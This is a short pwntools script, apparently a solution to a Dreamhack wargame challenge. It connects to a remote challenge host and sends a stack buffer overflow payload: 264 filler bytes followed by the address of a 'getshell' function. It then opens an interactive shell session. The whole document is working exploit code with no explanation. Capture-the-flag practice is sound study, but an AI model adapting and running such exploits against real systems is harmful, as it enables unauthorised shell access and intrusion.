from pwn import *

r=remote("host2.dreamhack.games",14245)
print("remote success")
getshell=0x08048659
a='0'
payload="A"*264+p32(getshell)

r.sendline(a)
r.sendline(payload)
r.interactive()

